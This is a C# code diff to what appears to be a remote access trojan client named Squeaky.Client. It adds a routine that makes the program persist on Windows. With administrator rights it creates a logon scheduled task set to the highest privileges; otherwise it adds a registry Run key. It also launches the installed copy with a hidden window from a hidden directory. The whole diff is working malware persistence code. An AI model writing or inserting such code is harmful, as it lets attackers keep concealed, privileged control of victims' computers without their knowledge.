@@ -3,6 +3,8 @@ using System.IO;
 using System.Diagnostics;
 using System.Threading;
 using System.Reflection;
+using System.Security.Principal;
+using Microsoft.Win32;
 
 namespace Squeaky.Client
 {
@@ -51,15 +53,57 @@ namespace Squeaky.Client
                 DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLATION));
                 di.Attributes |= FileAttributes.Hidden;
             }
+        }
 
-            var startInfo = new ProcessStartInfo
+        private static bool IsAdministrator()
+        {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
             {
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-                UseShellExecute = false,
-                FileName = Settings.INSTALLATION
-            };
-            Process.Start(startInfo);
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+        }
+
+        private static void AddToStartup()
+        {
+            if (IsAdministrator())
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                {
+                    Arguments = "/create /tn \"" + Settings.INSTALLNAME + "\" /sc ONLOGON /tr \"" + Settings.INSTALLATION +
+                                "\" /rl HIGHEST /f",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                Process p = Process.Start(startInfo);
+                p.WaitForExit(1000);
+                if (p.ExitCode == 0) return;
+            }
+
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+            {
+                key.SetValue(Settings.INSTALLNAME, "\"" + Settings.INSTALLATION + "\" -startup");
+            }
+        }
+
+        private static void Start()
+        {
+            if (Settings.STARTUP) AddToStartup();
+
+            if (Settings.INSTALL)
+            {
+                Install();
+
+                var startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    FileName = Settings.INSTALLATION
+                };
+                Process.Start(startInfo);
+            }
         }
     }
 }
